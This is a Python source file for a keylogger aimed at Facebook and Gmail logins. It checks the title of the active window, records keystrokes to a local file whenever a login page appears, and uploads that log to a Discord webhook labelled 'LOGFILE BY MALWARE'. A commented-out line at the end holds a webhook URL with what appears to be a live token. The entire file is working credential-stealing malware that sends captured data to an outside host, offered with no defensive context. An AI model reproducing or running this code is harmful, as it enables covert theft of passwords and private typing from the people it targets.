import time
import logging
from pynput.keyboard import Key, Listener
import threading
import win32gui
import time
from win32gui import GetWindowText, GetForegroundWindow
from dhooks import Webhook, File


def dis_send():
    print("FILE_SENT")
    hook = Webhook("DISCORD_WEBHOOK_API")
    discord_file = File("keylog12.txt")
    hook.send("LOGFILE BY MALWARE",file=discord_file)

    

logging.basicConfig(filename=("keylog12.txt"), level=logging.DEBUG, format="%(asctime)s - %(message)s")

def on_press(key):
    logging.info(str(key))

def run_logger(duration):
    
    with Listener(on_press=on_press) as listener:
        listener.join()

    time.sleep(duration)
    listener.stop()
    



tempWindowName = win32gui.GetWindowText(win32gui.GetForegroundWindow())

while True:
    tempWindowName=win32gui.GetWindowText (win32gui.GetForegroundWindow())
    print(GetWindowText(GetForegroundWindow()).lower())
    print("\n")
    #do what you want

    if 'facebook' and 'log in' in tempWindowName.lower():
        print("Logger Executed")
        logger_thread = threading.Thread(target=run_logger, args=(10,))
        logger_thread.start()
        time.sleep(10)
        dis_send()
        
    elif 'gmail' in tempWindowName.lower():
        print("Logger Executed")
        logger_thread = threading.Thread(target=run_logger, args=(10,))
        logger_thread.start()
        time.sleep(10)
        dis_send()
        
    
    else:
        pass
        time.sleep(1)




#webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1095710976298463313/_THZQn_yBvH2n3pPy4_vzapqMYuElbGLSKRzlGCQtHEahywXnmxkwm6ySvj1LPi0O_F5")


